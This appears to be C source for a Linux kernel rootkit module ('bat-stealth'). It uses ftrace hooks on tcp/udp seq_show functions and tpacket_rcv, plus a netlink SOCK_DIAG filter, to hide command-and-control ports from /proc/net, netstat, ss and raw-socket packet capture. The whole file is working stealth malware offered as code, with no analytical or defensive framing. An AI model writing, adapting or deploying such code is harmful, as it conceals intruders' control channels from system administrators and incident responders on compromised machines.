/* hiding_tcp.c — Hides C2 port from /proc/net/tcp*, ss, netstat, raw sockets.
 *
 * Ported from Singularity hiding_tcp.c with:
 *   - PORT hardcode replaced by bat_hidden_port global (sysfs-configurable)
 *   - IP-based server hiding removed (port-only for bat-stealth)
 *   - No arch-specific hooks needed (functions are not syscalls)
 */
#include "../include/core.h"
#include "../include/hiding_tcp.h"
#include "../include/sysfs_iface.h"
#include "../ftrace/ftrace_helper.h"

static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static asmlinkage long (*orig_udp6_seq_show)(struct seq_file *seq, void *v);
static int (*orig_tpacket_rcv)(struct sk_buff *skb, struct net_device *dev,
                                struct packet_type *pt, struct net_device *orig_dev);

/* inet_sk_diag_fill hook removed: static symbol in inet_diag module;
 * ftrace_set_filter_ip fails for it on kernel 6.1.
 * ss coverage is via tcp_hiding_filter_netlink() from audit.c recvmsg hook. */

static notrace inline bool is_hidden_port(u16 port)
{
    int i, n = READ_ONCE(bat_hidden_port_count);
    for (i = 0; i < n; i++) {
        if (READ_ONCE(bat_hidden_ports[i]) == port)
            return true;
    }
    return false;
}

static notrace bool should_hide_sock(struct sock *sk)
{
    struct inet_sock *inet;
    unsigned short sport, dport;

    if (!sk) return false;
    inet = inet_sk(sk);
    if (!inet) return false;

    sport = ntohs(inet->inet_sport);
    dport = ntohs(inet->inet_dport);

    return is_hidden_port(sport) || is_hidden_port(dport);
}

static notrace asmlinkage long hooked_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1)
        return orig_tcp4_seq_show(seq, v);
    if (unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_tcp4_seq_show(seq, v);
    if (should_hide_sock(sk)) return 0;
    return orig_tcp4_seq_show(seq, v);
}

static notrace asmlinkage long hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1)
        return orig_tcp6_seq_show(seq, v);
    if (unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_tcp6_seq_show(seq, v);
    if (should_hide_sock(sk)) return 0;
    return orig_tcp6_seq_show(seq, v);
}

static notrace asmlinkage long hooked_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1)
        return orig_udp4_seq_show(seq, v);
    if (unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_udp4_seq_show(seq, v);
    if (should_hide_sock(sk)) return 0;
    return orig_udp4_seq_show(seq, v);
}

static notrace asmlinkage long hooked_udp6_seq_show(struct seq_file *seq, void *v)
{
    struct sock *sk = v;
    if (v == SEQ_START_TOKEN || sk == (void *)1)
        return orig_udp6_seq_show(seq, v);
    if (unlikely(!sk || (unsigned long)sk < PAGE_SIZE))
        return orig_udp6_seq_show(seq, v);
    if (should_hide_sock(sk)) return 0;
    return orig_udp6_seq_show(seq, v);
}

static notrace int hooked_tpacket_rcv(struct sk_buff *skb, struct net_device *dev,
                                       struct packet_type *pt, struct net_device *orig_dev)
{
    struct iphdr   *iph;
    struct ipv6hdr *ip6h;
    struct tcphdr  *tcph;
    struct udphdr  *udph;
    unsigned int    hdr_len;

    if (unlikely(!skb || !dev || !orig_tpacket_rcv)) goto out;

    /* Skip loopback */
    if (dev->name[0] == 'l' && dev->name[1] == 'o')
        return NET_RX_DROP;

    if (skb_is_nonlinear(skb)) {
        if (in_hardirq() || skb_shared(skb)) goto out;
        if (skb_linearize(skb))              goto out;
    }

    if (skb->protocol == htons(ETH_P_IP)) {
        if (skb->len < sizeof(struct iphdr)) goto out;
        iph     = ip_hdr(skb);
        hdr_len = iph->ihl * 4;

        if (iph->protocol == IPPROTO_TCP) {
            if (hdr_len < sizeof(struct iphdr) ||
                skb->len < hdr_len + sizeof(struct tcphdr))
                goto out;
            tcph = (struct tcphdr *)((u8 *)iph + hdr_len);
            if (is_hidden_port(ntohs(tcph->dest)) ||
                is_hidden_port(ntohs(tcph->source)))
                return NET_RX_DROP;
        } else if (iph->protocol == IPPROTO_UDP) {
            if (hdr_len < sizeof(struct iphdr) ||
                skb->len < hdr_len + sizeof(struct udphdr))
                goto out;
            udph = (struct udphdr *)((u8 *)iph + hdr_len);
            if (is_hidden_port(ntohs(udph->dest)) ||
                is_hidden_port(ntohs(udph->source)))
                return NET_RX_DROP;
        }
    } else if (skb->protocol == htons(ETH_P_IPV6)) {
        if (skb->len < sizeof(struct ipv6hdr)) goto out;
        ip6h = ipv6_hdr(skb);

        if (ip6h->nexthdr == IPPROTO_TCP) {
            if (skb->len < sizeof(struct ipv6hdr) + sizeof(struct tcphdr))
                goto out;
            tcph = (struct tcphdr *)((u8 *)ip6h + sizeof(*ip6h));
            if (is_hidden_port(ntohs(tcph->dest)) ||
                is_hidden_port(ntohs(tcph->source)))
                return NET_RX_DROP;
        } else if (ip6h->nexthdr == IPPROTO_UDP) {
            if (skb->len < sizeof(struct ipv6hdr) + sizeof(struct udphdr))
                goto out;
            udph = (struct udphdr *)((u8 *)ip6h + sizeof(*ip6h));
            if (is_hidden_port(ntohs(udph->dest)) ||
                is_hidden_port(ntohs(udph->source)))
                return NET_RX_DROP;
        }
    }

out:
    return orig_tpacket_rcv(skb, dev, pt, orig_dev);
}

/*
 * tcp_hiding_filter_netlink — filters SOCK_DIAG responses in userspace buffer.
 *
 * Called from audit.c's recvmsg/recvfrom hooks AFTER the kernel copies the
 * netlink response to userspace. We re-parse the buffer in kernel space and
 * remove any inet_diag_msg entries that expose bat_hidden_port.
 *
 * This is the correct mechanism for covering `ss` (SOCK_DIAG netlink) when
 * ftrace-hooking inet_sk_diag_fill is not feasible (static symbol in module).
 *
 * Algorithm: walk the nlmsghdr chain, copy-forward non-hidden messages,
 * skip hidden ones. Output may be shorter than input.
 *
 * Returns new buffer length. Caller uses this as the return value of recvmsg/
 * recvfrom to tell userspace there is less data.
 */
notrace long tcp_hiding_filter_netlink(int protocol, unsigned char *buf, long len)
{
    unsigned char      *out  = buf;
    unsigned char      *in   = buf;
    unsigned char      *end  = buf + len;
    struct nlmsghdr    *nlh;
    long                out_len = 0;
    int                 nports;

    nports = READ_ONCE(bat_hidden_port_count);
    if (nports == 0 || !buf || len <= 0)
        return len;

    while (in + NLMSG_HDRLEN <= end) {
        nlh = (struct nlmsghdr *)in;

        /* Sanity: bad length → pass the rest unchanged */
        if (nlh->nlmsg_len < NLMSG_HDRLEN ||
            in + (long)nlh->nlmsg_len > end)
            break;

        unsigned int aligned = NLMSG_ALIGN(nlh->nlmsg_len);
        bool         hide    = false;

        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
            nlh->nlmsg_len  >= NLMSG_HDRLEN + sizeof(struct inet_diag_msg)) {

            struct inet_diag_msg *r =
                (struct inet_diag_msg *)NLMSG_DATA(nlh);
            u16 sport = ntohs(r->id.idiag_sport);
            u16 dport = ntohs(r->id.idiag_dport);

            if (is_hidden_port(sport) || is_hidden_port(dport))
                hide = true;
        }

        if (!hide) {
            if (out != in)
                memmove(out, in, nlh->nlmsg_len);
            out     += aligned;
            out_len += aligned;
        }

        in += aligned;
    }

    /* If nothing was filtered, return original length untouched */
    return (out_len > 0 && out_len < len) ? out_len : len;
}
EXPORT_SYMBOL(tcp_hiding_filter_netlink);

/* ss coverage: NOT via inet_sk_diag_fill (static symbol in inet_diag module,
 * ftrace_set_filter_ip fails). Covered by tcp_hiding_filter_netlink() called
 * from audit.c's recvmsg/recvfrom hooks instead. */
static struct ftrace_hook hooks[] = {
    HOOK("tcp4_seq_show",        hooked_tcp4_seq_show,    &orig_tcp4_seq_show),
    HOOK("tcp6_seq_show",        hooked_tcp6_seq_show,    &orig_tcp6_seq_show),
    HOOK("udp4_seq_show",        hooked_udp4_seq_show,    &orig_udp4_seq_show),
    HOOK("udp6_seq_show",        hooked_udp6_seq_show,    &orig_udp6_seq_show),
    HOOK("tpacket_rcv",          hooked_tpacket_rcv,      &orig_tpacket_rcv),
};

int hiding_tcp_init(void)
{
    size_t i;
    int err, installed = 0;

    for (i = 0; i < ARRAY_SIZE(hooks); i++) {
        err = fh_install_hook(&hooks[i]);
        if (err)
            pr_debug("bat-stealth: hiding_tcp hook %s failed: %d (non-fatal)\n",
                     hooks[i].name, err);
        else
            installed++;
    }
    /* All 5 hooks are built-in kernel symbols — require at least 2 */
    return (installed >= 2) ? 0 : -ENOENT;
}

void hiding_tcp_exit(void)
{
    size_t i;
    for (i = 0; i < ARRAY_SIZE(hooks); i++)
        fh_remove_hook(&hooks[i]);
}
